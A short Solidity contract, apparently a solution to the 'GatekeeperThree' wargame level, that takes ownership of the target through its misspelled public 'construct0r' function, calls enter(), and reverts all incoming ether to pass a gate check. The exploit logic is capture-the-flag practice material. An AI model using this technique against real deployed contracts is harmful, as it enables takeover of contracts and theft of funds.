// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

interface GatekeeperThreeI {
    function construct0r() external;

    function enter() external returns (bool);
}

contract GatekeeperThreeAttacker {
    GatekeeperThreeI gatekeeperThree;

    constructor(address _gatekeeperThree) {
        gatekeeperThree = GatekeeperThreeI(_gatekeeperThree);
    }

    function callConstruct0r() external {
        gatekeeperThree.construct0r();
    }

    function callEnter() external {
        gatekeeperThree.enter();
    }

    receive() external payable {
        revert();
    }
}
